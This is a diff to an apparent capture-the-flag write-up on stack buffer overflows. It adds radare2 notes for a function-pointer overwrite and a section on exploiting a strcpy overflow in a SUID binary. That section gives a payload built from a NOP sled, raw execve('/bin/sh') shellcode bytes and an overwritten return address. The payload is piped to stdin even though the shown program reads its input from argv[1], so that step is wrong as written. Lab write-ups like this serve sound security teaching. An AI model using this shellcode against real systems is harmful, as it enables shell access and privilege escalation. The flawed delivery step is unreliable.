@@ -489,6 +489,17 @@ Option A – inspect main in radare2
 \u2514           0x004005e2      c3             ret
 [0x00400470]> 
 ```
+From above the line in overflow-2/func-pointer.c code 'volatile int (*new_ptr) () = normal;' resembles 
+```
+0x004005b8      48c745f88205...   mov qword [var_8h], sym.normal
+```
+From the above pdf @ main we get 
+\u2502           ; var char **var_30h @ rbp-0x30     -> argv
+\u2502           ; var int64_t var_24h @ rbp-0x24    -> argc
+\u2502           ; var char *s @ rbp-0x16            -> buffer
+\u2502           ; var int64_t var_8h @ rbp-0x8      -> new_ptr
+
+
 From pdf @ main:
 
 s (your buffer[14]) is at: rbp - 0x16
@@ -520,3 +531,112 @@ this is the special function
 you did this, friend!
 ```
 What this does is it fills buffer to limit 14 then fills the location of the variable with the location for special() and it runs
+
+# Task 8 Buffer Overflow
+
+Simple explanation of this challenge
+```
+[...overflow-3]$ cat buffer-overflow.c
+#include <stdio.h>
+#include <stdlib.h>
+
+void copy_arg(char *string)
+{
+    char buffer[140];
+    strcpy(buffer, string);
+    printf("%s\n", buffer);
+    return 0;
+}
+
+int main(int argc, char **argv)
+{
+    printf("Here's a program that echo's out your input\n");
+    copy_arg(argv[1]);
+}
+```
+Key points:
+
+buffer is 140 bytes.
+
+strcpy(buffer, string) copies without length checking.
+
+If argv[1] is longer than 140 bytes, you:
+
+overflow buffer
+
+overwrite saved registers
+
+overwrite the return address
+
+If you overwrite the return address with an address that points into your own buffer, and that buffer contains shellcode, the CPU will execute your shellcode when copy_arg returns.
+
+To make hitting the shellcode easier, you prepend a NOP sled (\x90 bytes) before the shellcode.
+
+Goal:
+Use this to spawn a shell (then read secret.txt via the SUID binary).
+
+## Normal stack frame for copy_arg (before overflow):
+
+text
+          +---------------------------+
+          |       Stack Bottom        |
+          +---------------------------+
+          |       Return address      |  <- where copy_arg will return to
+          +---------------------------+
+          |      Saved registers      |
+          +---------------------------+
+          |     buffer[139] ...       |
+          |           ...             |
+          |     buffer[1]             |
+          |     buffer[0]             |
+          +---------------------------+
+          |        Stack Top          |
+          +---------------------------+
+Data is written from buffer[0] upwards in memory toward the return address.
+
+## After you overflow buffer with shellcode + junk + address:
+
+text
+          +---------------------------------------------+
+          |                 Stack Bottom                |
+          +---------------------------------------------+
+          | Address of buffer (overwritten ret addr)    |  <- now points into buffer
+          +---------------------------------------------+
+          | Random data (overwritten saved registers)   |
+          +---------------------------------------------+
+          | Random data (inside buffer)                 |
+          +---------------------------------------------+
+          | Shellcode (inside buffer)                   |
+          +---------------------------------------------+
+          |                 Stack Top                   |
+          +---------------------------------------------+
+When copy_arg returns, it uses the overwritten return address, which now points into your buffer (NOP sled + shellcode).
+
+## Your payload in memory (what strcpy writes into buffer and beyond):
+
+text
++-------------+-------------+-----------------+
+|  NOP Sled   |  Shellcode  | Return Address  |
++-------------+-------------+-----------------+
+^             ^             ^
+|             |             |
+|             |             +-- Overwrites saved return address
+|             +---------------- Shellcode to execve("/bin/sh")
++----------------------------- Many \x90 bytes (NOPs)
+So the actual Python payload looks like:
+
+bash
+python -c 'print(
+    "\x90" * NOP_COUNT +
+    "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05" +
+    "A" * PADDING +
+    "<return address in little-endian>"
+)' | ./buffer-overflow
+Where:
+
+NOP_COUNT = number of \x90 bytes (e.g. 30, 50, 100…)
+
+PADDING = bytes to fill up to the saved return address
+
+<return address in little-endian> = an address somewhere in the NOP sled region (e.g. start of buffer)
+
